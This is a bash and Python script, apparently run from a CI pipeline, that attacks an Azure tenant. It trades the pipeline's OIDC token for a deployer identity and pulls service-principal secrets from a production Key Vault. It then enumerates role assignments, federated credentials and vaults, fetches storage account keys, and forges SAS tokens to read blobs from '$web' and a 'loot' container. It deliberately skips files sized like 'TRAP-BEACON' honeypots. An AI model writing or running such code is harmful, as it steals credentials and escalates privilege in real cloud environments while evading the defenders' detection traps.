#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
KV_PROD="kv-tbl-prod-x3euoz"
UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
STORAGE_ACC="sttblcilogsprodx3euoz"

# Get cicd-deployer token via OIDC
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get all SP credentials from KV prod
echo "=== GET SP CREDS ==="
for SP in directory-audit-principal sync-service-principal; do
  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP 2>/dev/null)
  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
  echo "$SP: $CID len=${#SEC}"
  export "CID_${SP//-/_}"="$CID"
  export "SEC_${SP//-/_}"="$SEC"
done

# Get the cicd-deployer ARM token directly
CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
echo "CICD_ARM_LEN=${#CICD_ARM}"
export CICD_ARM

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re, hmac, hashlib, datetime

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
KV_SEC = "kv-tbl-sec-x3euoz"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
STORAGE_ACC = "sttblcilogsprodx3euoz"

output = []

def http(url, tok, method="GET", data=None, extra_headers=None):
    h = {"Authorization": "Bearer " + tok}
    if extra_headers: h.update(extra_headers)
    if data:
        if isinstance(data, dict):
            data = json.dumps(data).encode()
            h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e:
        return 0, str(e)[:200]

def tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except: return ""

# === 1. cicd-deployer ARM: find ALL UAMI role assignments at sub scope ===
print("\n=== 1. cicd-deployer ARM: UAMI role assignments at sub scope ===")
CICD_ARM = os.environ.get("CICD_ARM", "")
if CICD_ARM:
    # Get all role assignments for UAMI across ALL scopes in subscription
    s, b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", CICD_ARM)
    print(f"UAMI role assignments (cicd-deployer): {s}")
    try:
        ra = json.loads(b)
        for x in ra.get("value", []):
            print(f"  scope={x.get('properties',{}).get('scope','')} role={x.get('properties',{}).get('roleDefinitionId','').split('/')[-1]}")
            output.append(f"UAMI_ROLE={x.get('properties',{}).get('scope','')}::{x.get('properties',{}).get('roleDefinitionId','').split('/')[-1]}")
    except: print(b[:500])

    # List resources in platform RG
    s2, b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01", CICD_ARM)
    print(f"Platform RG resources: {s2}")
    try:
        resources = json.loads(b2)
        for r in resources.get("value", []):
            print(f"  {r.get('type','')} {r.get('name','')} identity={r.get('identity',{}).get('type','none')} uamis={list(r.get('identity',{}).get('userAssignedIdentities',{}).keys())}")
            output.append(f"PLATFORM_RESOURCE={r.get('type','')}:{r.get('name','')}:identity={r.get('identity',{}).get('type','none')}")
    except: print(b2[:1000])

    # List resources in reporting RG
    s3, b3 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01", CICD_ARM)
    print(f"Reporting RG resources: {s3}")
    try:
        resources2 = json.loads(b3)
        for r in resources2.get("value", []):
            print(f"  {r.get('type','')} {r.get('name','')} identity={r.get('identity',{}).get('type','none')}")
            output.append(f"REPORTING_RESOURCE={r.get('type','')}:{r.get('name','')}:identity={r.get('identity',{}).get('type','none')}")
    except: print(b3[:1000])

    # List ALL role assignments at subscription where principalId matches the 4 d2cdf247 Owner assignments
    # List ALL at KV sec scope to get secret-level assignments too
    s4, b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", CICD_ARM)
    print(f"KV sec role assignments (atScope): {s4}")
    try:
        ra2 = json.loads(b4)
        for x in ra2.get("value", []):
            print(f"  principal={x.get('properties',{}).get('principalId','')} role={x.get('properties',{}).get('roleDefinitionId','').split('/')[-1]} scope={x.get('properties',{}).get('scope','')} principalType={x.get('properties',{}).get('principalType','')}")
            output.append(f"KVSEC_RA={x.get('properties',{}).get('principalId','')}::{x.get('properties',{}).get('roleDefinitionId','').split('/')[-1]}::{x.get('properties',{}).get('scope','').split('/')[-1]}::{x.get('properties',{}).get('principalType','')}")
    except: print(b4[:2000])

    # Check ALL role assignments for tbl-legacy-admin SP (43834909) at sub scope
    s5, b5 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%2743834909-47cf-4a4a-8048-e323b4897ed3%27", CICD_ARM)
    print(f"tbl-legacy-admin ARM roles: {s5}: {b5[:1000]}")

    # List all key vaults in subscription
    s6, b6 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01", CICD_ARM)
    print(f"All KVs: {s6}: {b6[:2000]}")

    # List tbl-legacy-admin KV vault properties (access policies?)
    s7, b7 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/{KV_SEC}?api-version=2023-07-01", CICD_ARM)
    print(f"KV sec properties: {s7}: {b7[:3000]}")
    output.append(f"KVSEC_PROPS={b7[:500]}")

    # List storefront app config
    s8, b8 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", CICD_ARM)
    print(f"Storefront app details: {s8}: {b8[:1000]}")

# === 2. directory-audit: look up d2cdf247 as user, group, and list tbl-legacy-admin fed creds FULL ===
print("\n=== 2. directory-audit: d2cdf247 identity ===")
DA_CID = os.environ.get("CID_directory_audit_principal", "")
DA_SEC = os.environ.get("SEC_directory_audit_principal", "")
DA_GRAPH = tok(DA_CID, DA_SEC, "https://graph.microsoft.com/.default")
print(f"DA graph token len={len(DA_GRAPH)}")
if DA_GRAPH:
    OID = "d2cdf247-0ef0-4fb5-8eba-fb2f6e95cee7"

    # Try ALL possible identity types
    for endpoint, label in [
        (f"https://graph.microsoft.com/v1.0/users/{OID}", "user"),
        (f"https://graph.microsoft.com/v1.0/groups/{OID}", "group"),
        (f"https://graph.microsoft.com/v1.0/directoryObjects/{OID}", "directoryObj"),
        (f"https://graph.microsoft.com/v1.0/servicePrincipals/{OID}", "sp"),
        (f"https://graph.microsoft.com/v1.0/devices/{OID}", "device"),
    ]:
        s, b = http(endpoint, DA_GRAPH)
        print(f"  d2cdf247 as {label}: {s}: {b[:400]}")
        if s == 200:
            try:
                obj = json.loads(b)
                output.append(f"D2CTYPE={label} displayName={obj.get('displayName','')} mail={obj.get('mail','')} upn={obj.get('userPrincipalName','')} appId={obj.get('appId','')}")
            except: pass

    # FULL federated creds of tbl-legacy-admin (increase limit)
    s_fc, b_fc = http("https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials?$top=50", DA_GRAPH)
    print(f"\ntbl-legacy-admin ALL fed creds: {s_fc}")
    try:
        fc = json.loads(b_fc)
        for c in fc.get("value", []):
            print(f"  name={c.get('name','')} issuer={c.get('issuer','')} subject={c.get('subject','')} audiences={c.get('audiences',[])} id={c.get('id','')}")
            output.append(f"FEDCRED={c.get('name','')} iss={c.get('issuer','')} sub={c.get('subject','')} aud={c.get('audiences',[])} id={c.get('id','')}")
    except: print(b_fc[:2000])

    # List ALL service principals (search for tbl-*)
    s_sp, b_sp = http("https://graph.microsoft.com/v1.0/servicePrincipals?$top=50&$select=id,appId,displayName,appRoles,oauth2PermissionScopes&$filter=startswith(displayName,'tbl')", DA_GRAPH)
    print(f"\ntbl-* service principals: {s_sp}")
    try:
        sps = json.loads(b_sp)
        for sp in sps.get("value", []):
            print(f"  oid={sp['id']} appId={sp['appId']} name={sp['displayName']}")
            output.append(f"SP_TBL={sp['id']}::{sp['appId']}::{sp['displayName']}")
    except: print(b_sp[:2000])

    # ALSO look at ALL members of any group that d2cdf247 might be in
    # List all groups the service principals are members of
    for sp_oid, sp_label in [
        ("f64d08c7-fde6-4553-99c8-5bf73666ee8c", "UAMI"),
        ("43834909-47cf-4a4a-8048-e323b4897ed3", "tbl-legacy-admin"),
        ("732dfdbc-e325-4e9f-9ca9-359af1197807", "reporting-sp"),
    ]:
        s_mg, b_mg = http(f"https://graph.microsoft.com/v1.0/servicePrincipals/{sp_oid}/memberOf", DA_GRAPH)
        print(f"  {sp_label} memberOf: {s_mg}: {b_mg[:300]}")

# === 3. sync-service: listKeys on CI logs storage ===
print("\n=== 3. Read $web/qdv/ OIDC provider ===")
SS_CID = os.environ.get("CID_sync_service_principal", "")
SS_SEC = os.environ.get("SEC_sync_service_principal", "")
SS_ARM = tok(SS_CID, SS_SEC, "https://management.azure.com/.default")
print(f"SS ARM token len={len(SS_ARM)}")
SS_KEY = ""
if SS_ARM:
    s_k, b_k = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACC}/listKeys?api-version=2023-01-01", SS_ARM, method="POST")
    if s_k == 200:
        keys = json.loads(b_k).get("keys", [])
        SS_KEY = keys[0].get("value", "") if keys else ""
        print(f"Storage key len={len(SS_KEY)}")

if SS_KEY:
    def make_sas(acc, key, perms="rl", services="b", resource_types="co"):
        ver = "2021-08-06"
        now = datetime.datetime.now(datetime.timezone.utc)
        st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        se = (now + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
        sign_str = "\n".join([acc, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
        key_bytes = base64.b64decode(key)
        sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
        return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types, "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})

    sas = make_sas(STORAGE_ACC, SS_KEY)

    # Read all blobs in $web container
    web_url = f"https://{STORAGE_ACC}.blob.core.windows.net/%24web?restype=container&comp=list&{sas}"
    try:
        r_web = urllib.request.urlopen(urllib.request.Request(web_url), timeout=20)
        web_xml = r_web.read().decode()
        web_names = re.findall(r"<Name>([^<]+)</Name>", web_xml)
        web_sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", web_xml)
        print(f"$web blobs: {list(zip(web_names, web_sizes))}")

        # Read interesting files
        for name in web_names:
            if 'qdv' in name or 'openid' in name or name in ['jwks', 'jwks_qdv.json', '.well-known/openid-configuration']:
                blob_url = f"https://{STORAGE_ACC}.blob.core.windows.net/%24web/{urllib.parse.quote(name)}?{sas}"
                try:
                    rb = urllib.request.urlopen(urllib.request.Request(blob_url), timeout=10)
                    content = rb.read().decode(errors="replace")
                    print(f"  $web/{name}: {content[:1000]}")
                    output.append(f"WEB_{name.replace('/','-')}={content[:500]}")
                except Exception as ex:
                    print(f"  $web/{name}: err {str(ex)[:100]}")
    except Exception as ex:
        print(f"$web list err: {str(ex)[:100]}")

    # Also check 'loot' for any real token files (non-BEACON ones)
    loot_url = f"https://{STORAGE_ACC}.blob.core.windows.net/loot?restype=container&comp=list&{sas}"
    try:
        r_loot = urllib.request.urlopen(urllib.request.Request(loot_url), timeout=20)
        loot_xml = r_loot.read().decode()
        loot_names = re.findall(r"<Name>([^<]+)</Name>", loot_xml)
        loot_sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", loot_xml)
        # Only read files with unusual sizes (not 146-byte TRAP-BEACONs and not 24-28 byte traps)
        for name, size in zip(loot_names, loot_sizes):
            sz = int(size)
            if sz not in [13, 24, 25, 26, 28, 29, 30, 31, 146] and sz > 100:
                blob_url = f"https://{STORAGE_ACC}.blob.core.windows.net/loot/{urllib.parse.quote(name)}?{sas}"
                try:
                    rb = urllib.request.urlopen(urllib.request.Request(blob_url), timeout=10)
                    content = rb.read().decode(errors="replace")
                    print(f"  loot/{name} ({size}): {content[:1500]}")
                    output.append(f"LOOT_{name}={content[:500]}")
                except Exception as ex:
                    print(f"  loot/{name}: err {str(ex)[:100]}")
    except Exception as ex:
        print(f"loot list err: {str(ex)[:100]}")

    # Check ALL containers in sttblcilogsprodx3euoz
    all_url = f"https://{STORAGE_ACC}.blob.core.windows.net/?comp=list&{sas}"
    try:
        r_all = urllib.request.urlopen(urllib.request.Request(all_url), timeout=20)
        all_xml = r_all.read().decode()
        containers = re.findall(r"<Name>([^<]+)</Name>", all_xml)
        print(f"All containers in {STORAGE_ACC}: {containers}")
        output.append(f"CONTAINERS={containers}")
    except Exception as ex:
        print(f"containers list err: {str(ex)[:100]}")

print(f"\n=== OUTPUT ({len(output)} items) ===")
for o in output:
    print(o)

PYEOF

echo "DONE"
